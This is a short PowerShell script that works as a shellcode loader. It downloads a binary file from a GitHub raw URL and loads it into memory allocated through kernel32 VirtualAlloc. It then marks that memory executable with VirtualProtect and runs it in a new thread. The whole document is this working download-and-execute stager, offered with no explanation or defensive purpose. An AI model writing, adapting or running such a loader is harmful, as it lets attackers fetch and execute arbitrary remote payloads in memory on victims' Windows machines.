$url = "https://github.com/MJ06-BP/bp/raw/refs/heads/main/shellcode.bin"

try {
    $wc = New-Object Net.WebClient
    $shellcode = $wc.DownloadData($url)
} catch {
    Write-Host "[-] Download failed: $($_.Exception.Message)"
    exit
}

$size = $shellcode.Length

Add-Type -MemberDefinition @"
[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
[DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
[DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
"@ -Name Win32 -Namespace Native -PassThru

try {
    $addr = [Native.Win32]::VirtualAlloc([IntPtr]::Zero, [uint32]$size, 0x3000, 0x04)
    if ($addr -eq [IntPtr]::Zero) { throw "VirtualAlloc failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }

    [Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)

    $oldProtect = 0
    $success = [Native.Win32]::VirtualProtect($addr, [uint32]$size, 0x20, [ref]$oldProtect)
    if (-not $success) { throw "VirtualProtect failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }

    $tid = 0
    $thread = [Native.Win32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
    if ($thread -eq [IntPtr]::Zero) { throw "CreateThread failed (error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }

    Write-Host "[+] Executing shellcode"
    [Native.Win32]::WaitForSingleObject($thread, [uint32]::MaxValue)   # ← fixed line

    Write-Host "[+] Execution finished"
} catch {
    Write-Host "[-] Execution error: $($_.Exception.Message)"
}
